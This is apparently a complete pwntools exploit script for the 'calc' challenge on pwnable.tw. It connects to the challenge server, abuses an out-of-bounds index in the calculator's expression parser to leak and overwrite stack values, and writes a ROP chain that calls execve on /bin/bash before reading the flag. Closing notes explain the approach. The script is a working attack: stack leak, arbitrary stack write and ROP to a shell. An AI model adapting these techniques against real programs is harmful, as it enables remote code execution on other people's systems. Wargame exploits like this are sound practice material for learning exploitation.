from pwn import *

# check a signed int 32bit number
def overrange(x):
	if (x > (2**31)-1):
		return (2**31) - 1
	elif (x < -(2**31)):
		return -(2**31)
	return x	

# convert x into negative number
def negative(x): 
	return x - 2**32

# convert x into positive number
def positive(x):
	return 2**32 + x

# check the first bit of a number 32bit
def check_bit_sign(x):
	if(x > (2**31) - 1):
		return 1
	return 0	

# find a number result as long as result + before = after, sound easy, right? belive me, you can lose your brain xD 
# 32bit
def find_remain(after, before):
	a = check_bit_sign(after)
	b = check_bit_sign(before)
	if(a == 1 and b == 0):
		result = negative(after) - before
		if(result != overrange(result)):
			result = after - before	
	elif(a == 0 and b == 0):
		result = after - before
	elif(a == 0 and b == 1):
		result = after - negative(before)
		if(result != overrange(result)):
			result = before - after
	else:
		result = negative(after) - negative(before)
	return result

def main():		
	s = remote("chall.pwnable.tw", 10100)
	_ = s.recv()
	
	# offset of memory we're going to reset
	offset = [361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373]
	b_value = [0]*13
	# we need to put these values into that memory
	a_value = [0x080701aa, 0, 0x080701d1, 0, 0, 0x0805932f, 0, 0x0805c34b, 0x0000000b, 0x0807087f, 0x6e69622f, 0x7361622f, 0x00000068]
	
	# find esp of main()
	ebp_calc_offset = 360
	payl = "+" + str(ebp_calc_offset)
	s.sendline(payl)
	ebp = int(s.recv())
	if(ebp < 0):
		ebp = positive(ebp)
	esp = (ebp & 0xfffffff0) - 0x10

	# address of /bin/bash 
	a_value[6] = esp + 0x24

	# get values in stack memory behind ebp of calc function 
	# in fact we just need to find the first one
	count = 0
	for i in offset:
		payl = "+" + str(i)
		s.sendline(payl)
		b_value[count] = int(s.recv())
		if b_value[count] < 0:
			b_value[count] = positive(b_value[count])
		count += 1

	# start setting values in the memory we just check to exploit
	for i in range(0, 13):
		remain = find_remain(a_value[i], b_value[i])
		if remain < 0:
			payl = "+" + str(offset[i]) + str(remain)
			if i < 12:
				b_value[i+1] = -remain
		else:
			payl = "+" + str(offset[i]) + "+" + str(remain)
			if i < 12:
				b_value[i+1] = remain
		s.sendline(payl)
		_ = s.recv()		
	
	# exit calc function to enter the memory we just set
	s.sendline("q")
	s.sendline("cat /home/calc/flag")
	print s.recv()
	s.close()

if __name__ == "__main__":
	main()

'''
+ Some remiders:
0x1: Making use of the vulnerability of calc(), parse_expr() and eval() function allows us reading any value in the stack behind
	count variable(v1) (+offset), and resetting them (+offset+remain_value) with these values we want to exploit (we can use ROPgadget 
	to find some piece of code because NX is enable, so I think shellcode doesn't work)
0x2: have to find out the address where we will put "/bin/bash" on it
0x3: draw stack memory
0x4: some math about addition and subtraction >.<
'''
